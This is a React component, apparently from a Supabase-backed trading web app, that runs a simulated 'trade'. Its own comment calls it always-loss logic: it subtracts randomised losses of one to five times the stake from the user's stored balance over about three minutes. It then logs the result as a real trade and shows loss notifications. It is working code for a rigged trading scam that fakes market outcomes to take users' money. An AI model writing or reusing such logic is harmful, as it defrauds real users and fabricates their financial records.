import React, { useEffect, useRef } from "react";
import { toast } from "sonner";
import { supabase } from "@/lib/supabaseClient";
import { User } from "@supabase/supabase-js";

interface Props {
  user: User;
  amount: number;
  tradeType: "buy" | "sell";
  baseSymbol: string;
  pair: string;
  onComplete: () => void;
  onFail?: () => void;
}

const Market2: React.FC<Props> = ({
  user,
  amount,
  tradeType,
  baseSymbol,
  pair,
  onComplete,
  onFail,
}) => {
  const stopFlag = useRef(false);

  useEffect(() => {
    let currentStep = 0;
    let totalChange = 0;
    let steps: number[] = [];
    let totalTime = 0;
    let currentBalance = 0;

    window.__stopTrade = () => {
      stopFlag.current = true;
    };

    const fetchBalanceAndStart = async () => {
      const { data, error } = await supabase
        .from("profiles")
        .select("fiat_balance")
        .eq("id", user.id)
        .single();

      if (error || !data) {
        toast.error("Failed to fetch balance.");
        onFail?.();
        return;
      }

      currentBalance = data.fiat_balance || 0;

      if (currentBalance < amount) {
        toast.error("Insufficient balance.");
        onFail?.();
        return;
      }

      // Always-loss logic: 100% chance of losing per step
      while (totalTime < 180) {
        const delay = Math.floor(Math.random() * 5) + 1;
        if (totalTime + delay > 180) break;
        totalTime += delay;

        // Loss between 1x and 5x the stake amount
        const lossMultiplier = Math.random() * (5 - 1) + 1; // 1 to 5
        const lossAmount = -(amount * lossMultiplier);

        // Store as absolute amount (not percent)
        steps.push(lossAmount);
      }

      const runStep = async () => {
        if (stopFlag.current || currentStep >= steps.length) {
          const result = steps.reduce((sum, val) => sum + val, 0);
          const newBalance = currentBalance + result;

          await supabase
            .from("profiles")
            .update({ fiat_balance: newBalance })
            .eq("id", user.id);

          await supabase.from("recent_trades").insert({
            user_id: user.id,
            currency_pair: pair.replace("/", "").toUpperCase(),
            amount,
            trade_type: tradeType,
            gain_loss: Number(result.toFixed(2)),
          });

          toast(`❌ Final Loss: $${Math.abs(result).toFixed(2)}`, {
            style: {
              backgroundColor: "#dc2626",
              color: "#fff",
              fontWeight: "bold",
            },
          });

          onComplete();
          return;
        }

        const changeAmount = steps[currentStep];
        totalChange += changeAmount;
        currentBalance += changeAmount;

        const { error: updateError } = await supabase
          .from("profiles")
          .update({ fiat_balance: currentBalance })
          .eq("id", user.id);

        if (updateError) {
          toast.error("Balance update failed.");
          onFail?.();
          return;
        }

        toast(`📉 Loss: $${Math.abs(changeAmount).toFixed(2)}`, {
          style: {
            backgroundColor: "#ef4444",
            color: "#fff",
          },
        });

        currentStep++;
        const delay = Math.floor(Math.random() * 5000) + 1000;
        setTimeout(runStep, delay);
      };

      runStep();
    };

    fetchBalanceAndStart();
  }, []);

  return null;
};

export default Market2;
